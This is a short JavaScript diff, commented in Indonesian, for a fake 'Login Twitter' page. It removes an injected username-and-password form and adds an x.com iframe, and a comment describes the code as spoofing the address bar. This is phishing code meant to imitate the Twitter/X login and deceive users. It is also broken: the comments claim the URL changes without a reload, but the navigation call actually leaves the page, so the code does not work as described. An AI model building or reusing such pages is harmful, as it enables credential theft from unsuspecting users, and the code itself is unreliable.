@@ -5,18 +5,12 @@
   }
 
   function f() {
-    // Menampilkan konten login form di halaman yang sama
-    document.body.innerHTML = '<h2>Login Twitter</h2>';
-    document.body.innerHTML += '<form id="loginForm" action="#" method="post">';
-    document.body.innerHTML += '<label for="username">Username:</label><br>';
-    document.body.innerHTML += '<input type="text" id="username" name="username" placeholder="Username"><br><br>';
-    document.body.innerHTML += '<label for="password">Password:</label><br>';
-    document.body.innerHTML += '<input type="password" id="password" name="password" placeholder="Password"><br><br>';
-    document.body.innerHTML += '<input type="submit" value="Login"><br>';
-    document.body.innerHTML += '</form>';
-
     // Mengubah alamat URL di address bar ke x.com tanpa mereload halaman
-    window.location.href = "https://x.com";
+    window.location.href = "https://x.com";  // Alamat spoofed di address bar
+
+    // Menampilkan iframe yang memuat login form (x.com atau lainnya)
+    document.body.innerHTML = '<h2>Login via Iframe</h2>';
+    document.body.innerHTML += '<iframe src="https://x.com" width="100%" height="500px" id="loginIframe"></iframe>';
 
     // Mengecek kondisi dan redirect setelah pengalihan
     setTimeout(function() {
@@ -25,4 +19,4 @@
   }
 </script>
 
-<a href="#" onclick="f()">Login dTwitter</a>
+<a href="#" onclick="f()">Login Twitter</a>
